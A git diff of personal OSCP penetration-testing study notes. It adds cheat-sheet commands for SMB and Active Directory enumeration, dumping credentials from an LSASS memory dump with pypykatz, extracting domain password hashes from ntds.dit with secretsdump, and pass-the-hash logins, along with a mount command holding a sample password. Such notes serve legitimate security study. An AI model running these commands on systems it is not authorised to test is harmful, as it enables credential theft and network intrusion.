@@ -1,5 +1,12 @@
 # OSCP
 
+
+Linux commands:-
+
+	text:-
+	
+		grep test file.txt | awk '{print $3}' |  awk -F\@ '{print $1}'  //to extract name from emails contain test 
+	
 DNS:-
 	How to get the hostname of a server using nslookup
 	Steps:-
@@ -19,33 +26,42 @@ File Management:-
 		chattr : change files attribute (a:append,e:can't change,I:can't delete or move,etc..).	
 		ln originFile copyFile : to make hard link of originFile to copyFile
 		ln -s sourceFile copyFile : to make a soft link(shortcut in windows) to sourceFile, you will find -i when you ls -la copyFile.
-
+		mount -t cift -o 'user=r.yazan,password=yazan' //10.10.10.10/data /mnt/data    /mount a share from active directory user 
 
 
 
 	Windows:-
 	
 		dir /(A,S,Q): display files attributes,files in directories & sub directories,files owner.
+		net use x: //10.10.10.10/directory //to mount a drive in remote
 		
 Privilege Escalation:-
-
-	privilege escalation awsome scripts:-
-		1-WinPEAS
-		2-LinPEAS
-	LinEnum
-	WinEnum
-	Windows-Exploit-Suggestor
-
-SMB Enumeration:-
-
-	enum4linux,nmap to get domain controller + user 
-	smbmap -H 10.10.11.152 -u 'guest' -d Timelapse.htb     --- to search for readable/writable shares you can use -R for recursive 
-	smbclient //10.10.11.152/Shares -U Timelapse.htb/guest  --- to connect where Timelapse.htb is the domain controller and guest is the user
+	Tools:-
+		privilege escalation awsome scripts:-
+			1-WinPEAS
+			2-LinPEAS
+		LinEnum
+		WinEnum
+		Windows-Exploit-Suggestor
+	Windows:-
+		
+		seBackupPrivilege //related to backup https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf
 	
+
+ Enumeration:-
+ 	
+	SMB:-
+		enum4linux,nmap to get domain controller + user 
+		smbmap -H 10.10.11.152 -u 'guest' -d Timelapse.htb     --- to search for readable/writable shares you can use -R for recursive 
+		smbclient //10.10.11.152/Shares -U Timelapse.htb/guest  --- to connect where Timelapse.htb is the domain controller and guest is the user
+	metadata:-
+		
+		exiftool file  
 	
 Password Attacks
 
 	fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip	--- to crack zip files
+	pypykatz lsa minidump lsass.DMP //dump credentials from lsass
 
 
 General Information:-
@@ -61,6 +77,9 @@ General Information:-
 	
 	runas /netonly /user:domain.g\yazan cmd // to open a cmd with yazan user from active directory
 
+	lsass.exe verifies the logon name and password. If you terminate lsass.exe you will probably find yourself logged out of Windows //can dump credetials from it
+	
+	The Ntds. dit file is a database that stores Active Directory data, including information about user objects, groups and group membership. Importantly, the file also stores the password hashes for all users in the domain.
 	
 Active Directory Attacks:-
 
@@ -72,11 +91,13 @@ Active Directory Attacks:-
 			*psexec.py (system)
 			*GetUserSPNs.py
 			*wmiexec.py (adminisrator)
+			*secretdump.py 
 		3-Powerview
 		4-Rubeus
 		5-crackmapexec
 		6-kerbrute
 		7-mimikatz
+		8-pypykatz
 		
 	Kerberoasting: Post exploitation attack, require a valid user (TGT) to request TGS from a service account with SPN and crack the TGS to get the credentials out of it (TGS is encrypted with the NTLM hash of the SPN account password).
 		Tools that can be used:-
@@ -160,7 +181,12 @@ Active Directory Attacks:-
 	Enumeration:-
 		
 		crackmapexec smb 10.10.10.10 --shares -u '' -p ''
-		net user /domain user_name
+		net user /domain user_name  //on cmd
+		
+		kerbrute username --dc-ip 10.10.10.10 -d test.local -o output.txt user_input.txt  //check which username are valid 
+		
+		python3 bloodhound.py -u support -p 'password' -ns 10.10.10.10 -d domain -c all   //
+		
 	DCSync attack:-
 	
 		telling the domain contrller that you are a domain controller trying to replicate the hashes of the users.
@@ -179,4 +205,7 @@ Active Directory Attacks:-
 	
 		impacket-psexec.py domain.local/administrator@10.10.10.10 -H hash 
 	
+	Dumping active directory information
 	
+	Steps:-
+		secretdump.py -ntds ntds.dit -system system.hive LOCAL //where system.hive can be obtained
